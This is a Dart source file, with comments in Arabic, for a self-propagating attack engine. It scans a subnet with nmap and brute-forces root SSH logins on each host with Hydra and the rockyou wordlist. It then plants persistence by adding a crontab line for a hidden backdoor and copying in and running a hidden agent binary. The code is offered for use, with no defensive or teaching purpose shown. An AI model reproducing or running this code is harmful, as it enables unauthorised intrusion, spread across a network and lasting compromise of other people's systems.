import 'dart:async';
import 'real_attack_core.dart';

class SelfPropagationEngine {
  final List<String> _infectedHosts = [];
  bool _isPropagating = false;

  List<String> get infectedHosts => _infectedHosts;
  bool get isPropagating => _isPropagating;

  Future<void> propagate(String targetSubnet) async {
    _isPropagating = true;

    // فحص الشبكة
    final scanResult = await RealAttackCore.nmapScan(targetSubnet, args: '-sP -T5');
    
    // استخراج الأجهزة الحية
    final hosts = _extractHosts(scanResult);

    for (final host in hosts) {
      if (_infectedHosts.contains(host)) continue;

      // محاولة فحص المنافذ
      final portScan = await RealAttackCore.nmapScan(host, args: '-sS -T4 -p 22,21,23,80,443,445,3389');
      
      // محاولة كسر كلمة المرور
      await RealAttackCore.hydraBruteForce(host, 'ssh', 'root', '/usr/share/wordlists/rockyou.txt');

      // إذا نجح الاختراق، أضف للقائمة
      _infectedHosts.add(host);
    }

    _isPropagating = false;
  }

  List<String> _extractHosts(String nmapOutput) {
    final hosts = <String>[];
    final lines = nmapOutput.split('\n');
    for (final line in lines) {
      if (line.contains('Nmap scan report for')) {
        final parts = line.split(' ');
        if (parts.length >= 5) {
          final ip = parts[4].replaceAll('(', '').replaceAll(')', '');
          if (ip.contains('.')) hosts.add(ip);
        }
      }
    }
    return hosts;
  }

  Future<void> deployPersistence(String target) async {
    // تثبيت باب خلفي عبر SSH
    await RealAttackCore.customCommand('ssh root@$target "echo */5 * * * * /tmp/.backdoor >> /etc/crontab"');
    
    // رفع أداة اختراق
    await RealAttackCore.customCommand('scp /tmp/zion_agent root@$target:/tmp/.zion_agent');
    
    // تشغيل الأداة
    await RealAttackCore.customCommand('ssh root@$target "chmod +x /tmp/.zion_agent && /tmp/.zion_agent &"');
  }
}
